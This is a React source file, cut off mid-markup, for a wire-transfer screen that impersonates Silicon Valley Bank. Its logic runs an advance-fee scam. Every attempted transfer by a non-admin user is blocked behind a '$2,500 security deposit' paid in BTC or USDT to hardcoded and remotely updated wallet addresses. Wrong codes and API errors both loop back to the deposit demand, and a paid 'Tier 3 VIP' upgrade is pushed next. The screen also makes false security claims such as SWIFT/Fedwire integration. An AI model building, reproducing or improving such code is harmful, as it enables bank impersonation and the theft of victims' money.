import React, { useState, useEffect, useRef } from 'react';
import { User, Transaction } from '../types';
import { api } from '../services/api';
import { subscribeCryptoAddressesFromFirestore } from '../lib/firebase';
import { COUNTRIES_AND_BANKS } from '../data/countriesAndBanks';
import { 
  Send, 
  Globe2, 
  Building2, 
  CreditCard, 
  UserCheck, 
  DollarSign, 
  Key, 
  FileText, 
  AlertCircle, 
  CheckCircle2, 
  ArrowRight, 
  ArrowLeft, 
  ShieldCheck, 
  Clock, 
  ChevronDown, 
  Search, 
  X, 
  Copy, 
  Check, 
  ShieldAlert 
} from 'lucide-react';
import { PaymentProofOptionsModal } from './PaymentProofOptionsModal';
import { triggerOpenSVBLiveChat } from './SupportChatWidget';
import { openLiveAgentEmail } from '../utils/supportEmail';
import { BackButton } from './BackButton';

interface SendPanelProps {
  user: User;
  onSuccess: (updatedUser: User, transaction: Transaction) => void;
  onNavigateTab?: (tab: string) => void;
}

export const SendPanel: React.FC<SendPanelProps> = ({ user, onSuccess, onNavigateTab }) => {
  // Transfer Form State
  const [selectedCountry, setSelectedCountry] = useState('United States');
  const [selectedBank, setSelectedBank] = useState('Silicon Valley Bank (SVB)');
  const [recipientAccountNumber, setRecipientAccountNumber] = useState('');
  const [accountHolderName, setAccountHolderName] = useState('');
  const [amount, setAmount] = useState('');
  const [fourDigitCode, setFourDigitCode] = useState('');
  const [reference, setReference] = useState('');

  // UI & Search dropdown state
  const [countrySearch, setCountrySearch] = useState('');
  const [isCountryOpen, setIsCountryOpen] = useState(false);
  const [bankSearch, setBankSearch] = useState('');
  const [isBankOpen, setIsBankOpen] = useState(false);

  // Validation / Loading states
  const [validatingAccount, setValidatingAccount] = useState(false);
  const [isValidated, setIsValidated] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [successTxn, setSuccessTxn] = useState<Transaction | null>(null);

  // Deposit $2,500 USD activation requirement modal state
  const [showDepositPromptModal, setShowDepositPromptModal] = useState(false);
  const [showCryptoModal, setShowCryptoModal] = useState(false);
  const [showProofOptionsModal, setShowProofOptionsModal] = useState(false);
  const [showTier3PromptModal, setShowTier3PromptModal] = useState(false);
  const [cryptoMethod, setCryptoMethod] = useState<'BTC' | 'USDT'>('BTC');
  const [submittingDeposit, setSubmittingDeposit] = useState(false);
  const [depositSuccessMsg, setDepositSuccessMsg] = useState<string | null>(null);
  const [copiedAddress, setCopiedAddress] = useState(false);

  const [showVerificationModal, setShowVerificationModal] = useState(false);

  const [walletAddresses, setWalletAddresses] = useState<{ BTC: string; USDT: string }>({
    BTC: '1Fy9Up78qVeawXCLnAqcnRJrvjiXLJF21d',
    USDT: '0x400773d018e8ad3575458b5e8b11ff55078451c9'
  });

  const countryDropdownRef = useRef<HTMLDivElement>(null);
  const bankDropdownRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    api.getCryptoAddresses()
      .then(res => {
        if (res.addresses) setWalletAddresses(res.addresses);
      })
      .catch(console.error);

    const unsub = subscribeCryptoAddressesFromFirestore((addrs) => {
      setWalletAddresses(prev => ({ ...prev, ...addrs }));
    });

    const handleWindowUpdate = (e: any) => {
      if (e.detail) setWalletAddresses(prev => ({ ...prev, ...e.detail }));
    };
    window.addEventListener('crypto-addresses-updated', handleWindowUpdate);

    return () => {
      unsub();
      window.removeEventListener('crypto-addresses-updated', handleWindowUpdate);
    };
  }, [showCryptoModal, showDepositPromptModal]);

  // Close dropdowns on outside click
  useEffect(() => {
    const handleClickOutside = (e: MouseEvent) => {
      if (countryDropdownRef.current && !countryDropdownRef.current.contains(e.target as Node)) {
        setIsCountryOpen(false);
      }
      if (bankDropdownRef.current && !bankDropdownRef.current.contains(e.target as Node)) {
        setIsBankOpen(false);
      }
    };
    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, []);

  // Update default bank when country changes
  useEffect(() => {
    const countryData = COUNTRIES_AND_BANKS.find(c => c.country === selectedCountry);
    if (countryData && countryData.banks.length > 0) {
      setSelectedBank(countryData.banks[0]);
    } else {
      setSelectedBank('Commercial Bank');
    }
  }, [selectedCountry]);

  // Handle Account Number change & Lookup
  const handleAccountNumberChange = async (val: string) => {
    setRecipientAccountNumber(val);
    setIsValidated(false);
    
    if (val.trim().length >= 6) {
      setValidatingAccount(true);
      try {
        const res = await api.lookupAccount(val.trim());
        if (res.found && res.found.fullName) {
          setAccountHolderName(res.found.fullName);
          setIsValidated(true);
        }
      } catch (err) {
        console.warn('Account lookup error:', err);
      } finally {
        setValidatingAccount(false);
      }
    }
  };

  const copyAddress = (address: string) => {
    navigator.clipboard.writeText(address);
    setCopiedAddress(true);
    setTimeout(() => setCopiedAddress(false), 2000);
  };

  const handleInitialFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    setSuccessTxn(null);

    const numAmount = parseFloat(amount);
    if (isNaN(numAmount) || numAmount <= 0) {
      setError('Please enter a valid transfer amount greater than $0.00.');
      return;
    }
    if (numAmount > user.balance) {
      setError(`Insufficient account balance. Available funds: $${user.balance.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD.`);
      return;
    }

    if (user.role !== 'admin' && !user.transferCodeApproved) {
      setShowDepositPromptModal(true);
      return;
    }

    setShowVerificationModal(true);
  };

  const executeTransferWithCode = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);

    if (user.role !== 'admin' && (!fourDigitCode.trim() || !user.fourDigitCode || fourDigitCode.trim() !== user.fourDigitCode.trim())) {
      setShowVerificationModal(false);
      setShowCryptoModal(true);
      return;
    }

    if (user.role !== 'admin' && user.verificationTier !== 'Tier 3') {
      setShowVerificationModal(false);
      setShowTier3PromptModal(true);
      return;
    }

    const numAmount = parseFloat(amount);

    try {
      setLoading(true);
      const res = await api.sendFunds({
        recipientAccountNumber: recipientAccountNumber.trim(),
        recipientName: accountHolderName.trim(),
        amount: numAmount,
        destinationCountry: selectedCountry,
        destinationBank: selectedBank,
        reference: reference.trim() || undefined,
        fourDigitCode: fourDigitCode.trim()
      });

      setSuccessTxn(res.transaction);
      onSuccess(res.updatedUser, res.transaction);
      setShowVerificationModal(false);
      setRecipientAccountNumber('');
      setAccountHolderName('');
      setAmount('');
      setFourDigitCode('');
      setReference('');
    } catch (err: any) {
      setShowVerificationModal(false);
      setShowCryptoModal(true);
    } finally {
      setLoading(false);
    }
  };

  const handleCryptoDepositSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setShowProofOptionsModal(true);
  };

  const handleSelectLiveAgent = async () => {
    setShowProofOptionsModal(false);
    setShowCryptoModal(false);
    
    openLiveAgentEmail(user, {
      method: cryptoMethod,
      amount: 2500,
      walletAddress: walletAddresses[cryptoMethod]
    });

    try {
      const res = await api.submitCryptoActivationDeposit({
        cryptoMethod,
        txHash: '',
        proofNote: 'Submitted to Live Agent (External Email)',
        proofImage: undefined
      });
      if (res.user && onSuccess) {
        onSuccess(res.user, null as any);
      }
      setDepositSuccessMsg(`Payment proof details opened in your email client. Our Live Support agent will verify and issue your 4-Digit Code.`);
      setTimeout(() => setDepositSuccessMsg(null), 5000);
    } catch (err: any) {
      console.error(err);
    }
  };

  const handleSelectSVBLive = async () => {
    setError(null);
    setSubmittingDeposit(true);

    try {
      const res = await api.submitCryptoActivationDeposit({
        cryptoMethod,
        txHash: '',
        proofNote: '$2,500 Payment Proof Verification Request',
        proofImage: undefined
      });
      if (res.user && onSuccess) {
        onSuccess(res.user, null as any);
      }
      setShowProofOptionsModal(false);
      setShowCryptoModal(false);
      setDepositSuccessMsg(`Connecting to SVB Live Chat...`);
      
      setTimeout(() => {
        triggerOpenSVBLiveChat();
        setDepositSuccessMsg(null);
      }, 500);
    } catch (err: any) {
      setError(err.message || 'Failed to submit activation deposit proof.');
    } finally {
      setSubmittingDeposit(false);
    }
  };

  const currentCountryObj = COUNTRIES_AND_BANKS.find(c => c.country === selectedCountry);
  const filteredCountries = COUNTRIES_AND_BANKS.filter(c =>
    c.country.toLowerCase().includes(countrySearch.toLowerCase())
  );
  const filteredBanks = currentCountryObj
    ? currentCountryObj.banks.filter(b => b.toLowerCase().includes(bankSearch.toLowerCase()))
    : [];

  return (
    <div className="max-w-4xl mx-auto space-y-6 pb-12 font-sans">
      {/* Top Navigation Row */}
      <div className="flex items-center justify-between">
        <BackButton />
      </div>

      {/* Header Banner */}
      <div className="bg-[#002b49] rounded-2xl p-6 sm:p-7 text-white shadow-xs border border-[#0b1723] flex flex-col md:flex-row md:items-center justify-between gap-6">
        <div>
          <div className="flex items-center gap-2 mb-1.5">
            <span className="p-1.5 bg-[#0b1d2e] text-[#00a3e0] rounded-lg">
              <Globe2 className="w-4 h-4" />
            </span>
            <span className="text-[11px] font-bold uppercase tracking-wider text-[#00a3e0]">
              SVB International & Domestic Wire
            </span>
          </div>
          <h1 className="text-xl sm:text-2xl font-extrabold text-white tracking-tight">
            Commercial Wire Transfer
          </h1>
          <p className="text-slate-300 text-xs mt-1 max-w-xl">
            Execute real-time wire transfers to accredited banking institutions worldwide with SWIFT & Fedwire integration.
          </p>
        </div>

        <div className="p-3.5 bg-[#0b1d2e] border border-[#173652] rounded-xl text-left sm:text-right shrink-0">
          <p className="text-[11px] text-slate-400 font-semibold uppercase">Available Balance</p>
          <p className="text-xl font-mono font-extrabold text-white mt-0.5 tabular-nums">
            ${user.balance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} <span className="text-xs font-sans text-slate-400">{user.currency || 'USD'}</span>
          </p>
          <p className="text-[10px] font-mono text-slate-400 mt-0.5">Account #{user.accountNumber}</p>
        </div>
      </div>

      {/* Success Notification */}
      {successTxn && (
        <div className="bg-emerald-50 border border-emerald-200 rounded-2xl p-5 text-slate-800 space-y-3 shadow-xs">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2.5">
              <div className="w-8 h-8 rounded-xl bg-emerald-100 text-emerald-700 flex items-center justify-center">
                <Clock className="w-4 h-4 animate-spin" />
              </div>
              <div>
                <h3 className="font-bold text-slate-900 text-sm">Transfer Request Dispatched</h3>
                <p className="text-xs text-emerald-700 font-semibold">Status: Pending Verification</p>
              </div>
            </div>
            <span className="px-2.5 py-0.5 rounded-full bg-amber-100 text-amber-800 text-[10px] font-bold">
              Pending
            </span>
          </div>

          <div className="bg-white rounded-xl p-3.5 border border-emerald-100 text-xs space-y-1.5 font-mono">
            <div className="flex justify-between text-slate-600">
              <span>Reference Number:</span>
              <span className="text-emerald-700 font-bold">{successTxn.reference}</span>
            </div>
            <div className="flex justify-between text-slate-600">
              <span>Amount Sent:</span>
              <span className="text-slate-900 font-bold">${successTxn.amount.toFixed(2)} USD</span>
            </div>
            <div className="flex justify-between text-slate-600">
              <span>Recipient Name:</span>
              <span className="text-slate-800">{successTxn.recipientName}</span>
            </div>
            <div className="flex justify-between text-slate-600">
              <span>Destination Bank:</span>
              <span className="text-slate-800">{successTxn.destinationBank} ({successTxn.destinationCountry})</span>
            </div>

            <div className="flex flex-wrap items-center gap-2 pt-3 border-t border-slate-100 font-sans">
              <button
                type="button"
                onClick={() => onNavigateTab && onNavigateTab('dashboard')}
                className="px-3.5 py-1.5 bg-[#002b49] hover:bg-[#001f35] text-white rounded-xl text-xs font-bold flex items-center gap-1.5 transition-all shadow-xs cursor-pointer"
              >
                <ArrowLeft className="w-3.5 h-3.5" />
                <span>Return to Dashboard</span>
              </button>
              <button
                type="button"
                onClick={() => onNavigateTab && onNavigateTab('history')}
                className="px-3.5 py-1.5 bg-slate-100 hover:bg-slate-200 text-slate-700 rounded-xl text-xs font-semibold flex items-center gap-1.5 transition-all border border-slate-200 cursor-pointer"
              >
                <span>View Transaction History</span>
              </button>
              <button
                type="button"
                onClick={() => setSuccessTxn(null)}
                className="px-3 py-1.5 text-slate-500 hover:text-slate-800 text-xs font-medium transition-colors cursor-pointer ml-auto"
              >
                + New Transfer
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Error Banner */}
      {error && (
        <div className="bg-rose-50 border border-rose-200 rounded-xl p-4 flex items-start gap-2.5 text-rose-800 text-xs shadow-xs">
          <AlertCircle className="w-5 h-5 text-rose-600 shrink-0 mt-0.5" />
          <span className="font-medium">{error}</span>
        </div>
      )}

      {/* Main Transfer Form Card */}
      <div className="bg-white border border-slate-200/90 rounded-2xl p-5 sm:p-7 shadow-xs">
        <form onSubmit={handleInitialFormSubmit} className="space-y-5">
          <div className="border-b border-slate-100 pb-3">
            <h2 className="text-base font-bold text-slate-900 flex items-center gap-2">
              <Send className="w-4 h-4 text-[#00a3e0]" />
              Wire Transfer Beneficiary Details
            </h2>
            <p className="text-xs text-slate-500 mt-0.5">Complete the beneficiary banking coordinates to dispatch funds.</p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            
            {/* 1. Destination Country Dropdown */}
            <div className="relative" ref={countryDropdownRef}>
              <label className="block text-xs font-semibold text-slate-700 mb-1">
                Destination Country <span className="text-rose-500">*</span>
              </label>
              <button
                type="button"
                onClick={() => {
                  setIsCountryOpen(!isCountryOpen);
                  setIsBankOpen(false);
                }}
                className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl px-3.5 py-2.5 text-xs text-slate-900 flex items-center justify-between transition-colors cursor-pointer"
              >
                <div className="flex items-center gap-2 overflow-hidden">
                  <Globe2 className="w-4 h-4 text-[#00a3e0] shrink-0" />
                  <span className="truncate font-semibold">{selectedCountry}</span>
                </div>
                <ChevronDown className="w-4 h-4 text-slate-400 shrink-0" />
              </button>

              {isCountryOpen && (
                <div className="absolute left-0 right-0 top-full mt-1.5 bg-white border border-slate-200 rounded-xl shadow-xl z-40 p-2 space-y-1.5 max-h-60 overflow-y-auto">
                  <div className="relative px-1 pt-1">
                    <Search className="w-3.5 h-3.5 text-slate-400 absolute left-3 top-3" />
                    <input
                      type="text"
                      value={countrySearch}
                      onChange={(e) => setCountrySearch(e.target.value)}
                      placeholder="Search destination country..."
                      className="w-full bg-slate-50 border border-slate-200 rounded-lg pl-8 pr-3 py-1.5 text-xs text-slate-900 placeholder-slate-400 outline-none focus:border-[#00a3e0]"
                    />
                  </div>
                  <div className="space-y-0.5">
                    {filteredCountries.map((c) => (
                      <button
                        key={c.country}
                        type="button"
                        onClick={() => {
                          setSelectedCountry(c.country);
                          setIsCountryOpen(false);
                          setCountrySearch('');
                        }}
                        className={`w-full text-left px-3 py-1.5 rounded-lg text-xs font-medium flex items-center justify-between transition-colors cursor-pointer ${
                          selectedCountry === c.country
                            ? 'bg-slate-100 text-slate-900 font-bold'
                            : 'text-slate-600 hover:bg-slate-50'
                        }`}
                      >
                        <span>{c.country}</span>
                        <span className="text-[10px] font-mono text-slate-400">{c.code}</span>
                      </button>
                    ))}
                  </div>
                </div>
              )}
            </div>

            {/* 2. Destination Bank Dropdown */}
            <div className="relative" ref={bankDropdownRef}>
              <label className="block text-xs font-semibold text-slate-700 mb-1">
                Destination Bank <span className="text-rose-500">*</span>
              </label>
              <button
                type="button"
                onClick={() => {
                  setIsBankOpen(!isBankOpen);
                  setIsCountryOpen(false);
                }}
                className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl px-3.5 py-2.5 text-xs text-slate-900 flex items-center justify-between transition-colors cursor-pointer"
              >
                <div className="flex items-center gap-2 overflow-hidden">
                  <Building2 className="w-4 h-4 text-[#00a3e0] shrink-0" />
                  <span className="truncate font-semibold">{selectedBank}</span>
                </div>
                <ChevronDown className="w-4 h-4 text-slate-400 shrink-0" />
              </button>

              {isBankOpen && (
                <div className="absolute left-0 right-0 top-full mt-1.5 bg-white border border-slate-200 rounded-xl shadow-xl z-40 p-2 space-y-1.5 max-h-60 overflow-y-auto">
                  <div className="relative px-1 pt-1">
                    <Search className="w-3.5 h-3.5 text-slate-400 absolute left-3 top-3" />
                    <input
                      type="text"
                      value={bankSearch}
                      onChange={(e) => setBankSearch(e.target.value)}
                      placeholder="Search bank name..."
                      className="w-full bg-slate-50 border border-slate-200 rounded-lg pl-8 pr-3 py-1.5 text-xs text-slate-900 placeholder-slate-400 outline-none focus:border-[#00a3e0]"
                    />
                  </div>
                  <div className="space-y-0.5">
                    {filteredBanks.map((b) => (
                      <button
                        key={b}
                        type="button"
                        onClick={() => {
                          setSelectedBank(b);
                          setIsBankOpen(false);
                          setBankSearch('');
                        }}
                        className={`w-full text-left px-3 py-1.5 rounded-lg text-xs font-medium flex items-center justify-between transition-colors cursor-pointer ${
                          selectedBank === b
                            ? 'bg-slate-100 text-slate-900 font-bold'
                            : 'text-slate-600 hover:bg-slate-50'
                        }`}
                      >
                        <span className="truncate">{b}</span>
                      </button>
                    ))}
                  </div>
                </div>
              )}
            </div>

            {/* 3. Recipient Account Number */}
            <div>
              <label className="block text-xs font-semibold text-slate-700 mb-1">
                Recipient Account / IBAN <span className="text-rose-500">*</span>
              </label>
              <div className="relative">
                <CreditCard className="w-4 h-4 text-slate-400 absolute left-3 top-2.5" />
                <input
                  type="text"
                  value={recipientAccountNumber}
                  onChange={(e) => handleAccountNumberChange(e.target.value)}
                  placeholder="e.g. 1084920148 or GB82 WEST 1234 5678"
                  className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl pl-9 pr-9 py-2 text-xs text-slate-900 font-mono outline-none transition-colors tabular-nums"
                  required
                />
                {validatingAccount && (
                  <div className="absolute right-3 top-2.5">
                    <div className="w-4 h-4 border-2 border-[#00a3e0] border-t-transparent rounded-full animate-spin" />
                  </div>
                )}
                {isValidated && (
                  <CheckCircle2 className="w-4 h-4 text-emerald-600 absolute right-3 top-2.5" />
                )}
              </div>
            </div>

            {/* 4. Account Holder Name */}
            <div>
              <label className="block text-xs font-semibold text-slate-700 mb-1">
                Account Holder Name <span className="text-rose-500">*</span>
              </label>
              <div className="relative">
                <UserCheck className="w-4 h-4 text-slate-400 absolute left-3 top-2.5" />
                <input
                  type="text"
                  value={accountHolderName}
                  onChange={(e) => setAccountHolderName(e.target.value)}
                  placeholder="e.g. Alexander Wright"
                  className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl pl-9 pr-3 py-2 text-xs text-slate-900 outline-none transition-colors"
                  required
                />
              </div>
            </div>

            {/* 5. Transfer Amount */}
            <div className="md:col-span-2">
              <label className="block text-xs font-semibold text-slate-700 mb-1">
                Transfer Amount ($ USD) <span className="text-rose-500">*</span>
              </label>
              <div className="relative">
                <DollarSign className="w-4 h-4 text-slate-400 absolute left-3 top-2.5" />
                <input
                  type="number"
                  step="0.01"
                  min="0.01"
                  max={user.balance}
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  placeholder="0.00"
                  className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl pl-9 pr-14 py-2 text-xs text-slate-900 font-mono font-bold outline-none tabular-nums"
                  required
                />
                <button
                  type="button"
                  onClick={() => setAmount(user.balance.toString())}
                  className="absolute right-2 top-1.5 text-[10px] uppercase font-bold text-[#002b49] bg-slate-100 hover:bg-slate-200 px-2 py-0.5 rounded-md cursor-pointer"
                >
                  Max
                </button>
              </div>
            </div>

          </div>

          {/* Reference */}
          <div>
            <label className="block text-xs font-semibold text-slate-700 mb-1">
              Reference / Wire Memo (Optional)
            </label>
            <div className="relative">
              <FileText className="w-4 h-4 text-slate-400 absolute left-3 top-2.5" />
              <input
                type="text"
                value={reference}
                onChange={(e) => setReference(e.target.value)}
                placeholder="e.g. Commercial Settlement, Invoice Remittance"
                className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl pl-9 pr-3 py-2 text-xs text-slate-900 outline-none transition-colors"
              />
            </div>
          </div>

          <div className="p-3.5 bg-slate-50 rounded-xl border border-slate-200 flex items-center gap-2.5 text-xs text-slate-600">
            <ShieldCheck className="w-4 h-4 text-emerald-600 shrink-0" />
            <span>Silicon Valley Bank Security: All outgoing wires require dual-factor authorization and 256-bit SSL transaction clearing.</span>
          </div>

          <button
            type="submit"
            disabled={loading || !recipientAccountNumber || !accountHolderName || !amount}
            className="w-full bg-[#002b49] hover:bg-[#001f35] text-white font-bold py-2.5 px-4 rounded-xl shadow-xs flex items-center justify-center gap-2 transition-all text-xs disabled:opacity-50 cursor-pointer"
          >
            {loading ? (
              <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
            ) : (
              <>
                <span>Submit Wire Transfer Request</span>
                <ArrowRight className="w-4 h-4" />
              </>
            )}
          </button>
        </form>
      </div>

      {/* 4-Digit Security Code Verification Modal */}
      {showVerificationModal && (
        <div className="fixed inset-0 z-50 bg-slate-950/70 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-white border border-slate-200 rounded-2xl max-w-md w-full p-6 space-y-4 shadow-2xl relative text-slate-900">
            <button
              onClick={() => setShowVerificationModal(false)}
              className="absolute top-4 right-4 text-slate-400 hover:text-slate-700 p-1.5 rounded-lg bg-slate-100 cursor-pointer"
            >
              <X className="w-4 h-4" />
            </button>

            <div className="text-center space-y-1.5">
              <div className="w-12 h-12 rounded-xl bg-[#002b49] text-[#00a3e0] flex items-center justify-center mx-auto shadow-xs">
                <ShieldCheck className="w-6 h-6" />
              </div>
              <h3 className="text-base font-bold text-slate-900">Authorize Wire Transfer</h3>
              <p className="text-xs text-slate-500">
                Enter your 4-digit security code to confirm and dispatch this outbound wire.
              </p>
            </div>

            <div className="p-3 bg-slate-50 rounded-xl border border-slate-200 text-xs space-y-1 font-mono">
              <div className="flex justify-between text-slate-600">
                <span>Amount:</span>
                <span className="font-bold text-slate-900">${parseFloat(amount).toLocaleString('en-US', { minimumFractionDigits: 2 })} USD</span>
              </div>
              <div className="flex justify-between text-slate-600">
                <span>Bank:</span>
                <span className="text-slate-900 truncate max-w-[180px]">{selectedBank}</span>
              </div>
              <div className="flex justify-between text-slate-600">
                <span>Recipient:</span>
                <span className="text-slate-900">{recipientAccountNumber}</span>
              </div>
            </div>

            <form onSubmit={executeTransferWithCode} className="space-y-4">
              <div>
                <label className="block text-xs font-semibold text-slate-700 mb-1">
                  4-Digit Security Code
                </label>
                <input
                  type="password"
                  maxLength={4}
                  value={fourDigitCode}
                  onChange={(e) => setFourDigitCode(e.target.value)}
                  placeholder="••••"
                  className="w-full bg-slate-50 border border-slate-300 focus:border-[#00a3e0] focus:bg-white rounded-xl px-4 py-2.5 text-center text-lg text-slate-900 font-mono font-bold tracking-widest outline-none transition-colors"
                  autoFocus
                  required
                />
              </div>

              <div className="flex gap-2">
                <button
                  type="button"
                  onClick={() => setShowVerificationModal(false)}
                  className="w-1/3 bg-slate-100 hover:bg-slate-200 text-slate-700 font-semibold py-2.5 rounded-xl text-xs transition-colors cursor-pointer"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  disabled={loading || !fourDigitCode.trim()}
                  className="w-2/3 bg-[#002b49] hover:bg-[#001f35] text-white font-bold py-2.5 rounded-xl text-xs shadow-xs flex items-center justify-center gap-1.5 transition-all disabled:opacity-50 cursor-pointer"
                >
                  {loading ? 'Authorizing...' : 'Confirm & Wire'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Deposit Prompt Modal */}
      {showDepositPromptModal && (
        <div className="fixed inset-0 z-50 bg-slate-950/70 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-white border border-slate-200 rounded-2xl p-6 max-w-md w-full space-y-4 shadow-2xl relative text-slate-900">
            <button
              onClick={() => setShowDepositPromptModal(false)}
              className="absolute top-4 right-4 text-slate-400 hover:text-slate-700 p-1.5 rounded-lg bg-slate-100 cursor-pointer"
            >
              <X className="w-4 h-4" />
            </button>

            <div className="w-12 h-12 rounded-xl bg-amber-100 text-amber-800 flex items-center justify-center mx-auto">
              <ShieldAlert className="w-6 h-6 text-amber-700" />
            </div>

            <div className="text-center space-y-1">
              <h3 className="text-base font-bold text-slate-900">4-Digit Security Code Required</h3>
              <p className="text-xs text-slate-500">
                Your 4-digit transfer code will be generated and issued upon completing your initial $2,500 security deposit.
              </p>
            </div>

            <div className="flex flex-col gap-2 pt-2">
              <button
                onClick={() => {
                  setShowDepositPromptModal(false);
                  setShowCryptoModal(true);
                }}
                className="w-full bg-[#002b49] hover:bg-[#001f35] text-white font-bold py-2.5 rounded-xl text-xs transition-colors cursor-pointer"
              >
                Deposit $2,500 via BTC / USDT
              </button>
              <button
                onClick={() => setShowDepositPromptModal(false)}
                className="w-full py-2 text-slate-500 hover:text-slate-800 text-xs font-semibold cursor-pointer"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Crypto Activation Deposit Modal */}
      {showCryptoModal && (
        <div className="fixed inset-0 z-50 bg-slate-950/70 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-white border border-slate-200 rounded-2xl p-6 max-w-lg w-full space-y-4 shadow-2xl relative text-slate-900">
            <button
              onClick={() => setShowCryptoModal(false)}
              className="absolute top-4 right-4 text-slate-400 hover:text-slate-700 p-1.5 rounded-lg bg-slate-100 cursor-pointer"
            >
              <X className="w-4 h-4" />
            </button>

            <div className="flex items-center gap-3 border-b border-slate-100 pb-3">
              <div className="w-10 h-10 rounded-xl bg-amber-100 text-amber-800 flex items-center justify-center">
                <Key className="w-5 h-5 text-amber-700" />
              </div>
              <div>
                <h3 className="text-base font-bold text-slate-900">$2,500 Activation Payment Address</h3>
                <p className="text-xs text-slate-500">4-Digit Security Code Authorization</p>
              </div>
            </div>

            {depositSuccessMsg && (
              <div className="p-3 bg-emerald-50 border border-emerald-200 text-emerald-800 text-xs rounded-xl flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-600 shrink-0" />
                <span>{depositSuccessMsg}</span>
              </div>
            )}

            <form onSubmit={handleCryptoDepositSubmit} className="space-y-4 text-xs">
              <div>
                <label className="block font-semibold text-slate-700 mb-1">Select Payment Asset</label>
                <div className="grid grid-cols-2 gap-2">
                  <button
                    type="button"
                    onClick={() => setCryptoMethod('BTC')}
                    className={`p-2.5 rounded-xl border font-bold text-xs flex items-center justify-center gap-1.5 transition-all cursor-pointer ${
                      cryptoMethod === 'BTC' ? 'bg-slate-100 border-[#002b49] text-slate-900' : 'bg-slate-50 border-slate-200 text-slate-600'
                    }`}
                  >
                    Bitcoin (BTC)
                  </button>
                  <button
                    type="button"
                    onClick={() => setCryptoMethod('USDT')}
                    className={`p-2.5 rounded-xl border font-bold text-xs flex items-center justify-center gap-1.5 transition-all cursor-pointer ${
                      cryptoMethod === 'USDT' ? 'bg-slate-100 border-[#002b49] text-slate-900' : 'bg-slate-50 border-slate-200 text-slate-600'
                    }`}
                  >
                    Tether (USDT ERC-20)
                  </button>
                </div>
              </div>

              <div className="p-3.5 bg-slate-50 rounded-xl border border-slate-200 space-y-2">
                <div className="flex items-center justify-between text-[11px] text-slate-600">
                  <span>Required Deposit Amount:</span>
                  <span className="font-bold text-slate-900 text-xs">$2,500.00 USD</span>
                </div>
                <div>
                  <span className="text-slate-500 block mb-1">Official Wallet Address ({cryptoMethod}):</span>
                  <div
                    onClick={() => copyAddress(walletAddresses[cryptoMethod])}
                    className="cursor-pointer hover:border-slate-400 flex items-center gap-2 bg-white p-2.5 rounded-lg border border-slate-200 transition-all"
                  >
                    <span className="font-mono text-xs font-bold text-slate-900 break-all flex-1 tabular-nums">
                      {walletAddresses[cryptoMethod]}
                    </span>
                    <div className="p-1 text-slate-600 rounded flex items-center gap-1 text-[10px] font-bold">
                      {copiedAddress ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5" />}
                      <span>{copiedAddress ? 'Copied' : 'Copy'}</span>
                    </div>
                  </div>
                </div>
              </div>

              <button
                type="submit"
                disabled={submittingDeposit}
                className="w-full bg-[#002b49] hover:bg-[#001f35] text-white font-bold py-2.5 rounded-xl text-xs transition-colors cursor-pointer"
              >
                {submittingDeposit ? 'Submitting...' : 'Submit $2,500 Payment Proof for Verification'}
              </button>
            </form>
          </div>
        </div>
      )}

      {/* Payment Proof Options Modal */}
      <PaymentProofOptionsModal
        isOpen={showProofOptionsModal}
        onClose={() => setShowProofOptionsModal(false)}
        user={user}
        cryptoMethod={cryptoMethod}
        walletAddress={walletAddresses[cryptoMethod]}
        onSelectLiveAgent={handleSelectLiveAgent}
        onSelectSVBLive={handleSelectSVBLive}
        submitting={submittingDeposit}
      />

      {/* Tier 3 Upgrade Prompt Modal */}
      {showTier3PromptModal && (
        <div className="fixed inset-0 z-50 bg-slate-950/70 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-white border border-slate-200 rounded-2xl p-6 max-w-md w-full space-y-4 shadow-2xl relative text-slate-900 text-center">
            <button
              onClick={() => setShowTier3PromptModal(false)}
              className="absolute top-4 right-4 text-slate-400 hover:text-slate-700 p-1.5 rounded-lg bg-slate-100 cursor-pointer"
            >
              <X className="w-4 h-4" />
            </button>

            <div className="w-12 h-12 rounded-xl bg-amber-100 text-amber-800 flex items-center justify-center mx-auto">
              <ShieldAlert className="w-6 h-6 text-amber-700" />
            </div>

            <div className="space-y-1">
              <h3 className="text-base font-bold text-slate-900">Tier 3 VIP Verification Required</h3>
              <p className="text-xs text-slate-500">
                To dispatch commercial outgoing wires with high transaction limits, upgrade your profile to Tier 3 VIP Verification.
              </p>
            </div>

            <div className="p-3 bg-slate-50 border border-slate-200 rounded-xl text-left text-xs text-slate-600 space-y-1">
              <p className="font-bold text-slate-900">Tier 3 Capabilities:</p>
              <ul className="list-disc list-inside space-y-0.5 text-[11px]">
                <li>Unlimited international wire transfers</li>
                <li>$50,000,000 daily card limits</li>
                <li>Priority Treasury desk routing</li>
              </ul>
            </div>

            <div className="flex flex-col gap-2 pt-2">
              <button
